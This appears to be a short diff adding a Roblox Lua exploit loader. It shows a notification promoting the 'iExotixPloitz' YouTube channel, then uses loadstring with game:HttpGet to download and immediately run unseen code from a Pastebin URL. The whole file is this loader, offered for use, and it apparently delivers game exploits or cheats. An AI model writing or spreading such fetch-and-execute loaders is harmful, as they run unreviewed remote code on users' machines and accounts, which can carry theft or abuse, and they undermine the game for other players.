@@ -1,0 +1,3 @@
+game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Subscribe to iExotixPloitz on YouTube!", Text = "Script is made by UbiquitousGaming#9383"})
+ 
+loadstring(game:HttpGet("https://pastebin.com/raw/YePwz5u5", true))()
